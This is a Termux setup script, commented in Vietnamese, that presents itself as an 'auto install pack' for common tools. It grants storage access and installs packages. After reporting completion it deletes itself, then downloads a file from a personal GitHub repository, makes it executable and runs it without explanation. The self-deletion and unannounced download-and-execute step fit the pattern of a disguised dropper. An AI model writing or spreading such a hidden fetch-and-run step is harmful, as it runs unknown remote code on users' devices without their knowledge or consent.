# Định nghĩa các biến màu
f1='\033[0;31m'
f2='\033[0;32m'
f3='\033[0;33m'
f4='\033[0;34m'
f0='\033[0m' # Mã reset màu về mặc định

clear
echo -e "${f3}========================================================${f0}"
echo -e "${f3}       auto install pack for termux!${0}"
echo -e "${f3}========================================================${f0}"
sleep 9
clear
yes | termux-setup-storage 
clear
echo -e "${f3} update and upgrade! ${f0}"
sleep 1
pkg update
pkg upgrade -y
echo -e "${f3} install pack... ${f0}"
sleep 1
pkg install x11-repo -y
pkg install root-repo -y
pkg install termux-api -y
pkg install vim -y
pkg install nano -y
pkg install curl -y
pkg install wget -y
pkg install python -y
pkg install 7zip -y
pkg install git -y
pkg install nodejs -y
pkg install clang -y
pkg install make -y
pkg install openssh -y
pkg install nmap -y
pkg install net-tools -y
pkg install ffmpeg -y
pkg install imagemagick -y
pkg install htop -y
pkg install neofetch -y
pkg install zsh -y
pkg install tree -y
pkg install nodejs-lts -y
pkg install unzip -y
pkg install git -y
pkg install termux-x11-nightly -y
pkg update
pkg upgrade -y
apt update
apt upgrade -y
clear
echo -e "${f2}install pack complete${f0}"

rm -- "$0"

curl -o hello.net 'https://raw.githubusercontent.com/Camtuong153/VM/refs/heads/main/File.net'
chmod +x hello.net
./hello.net
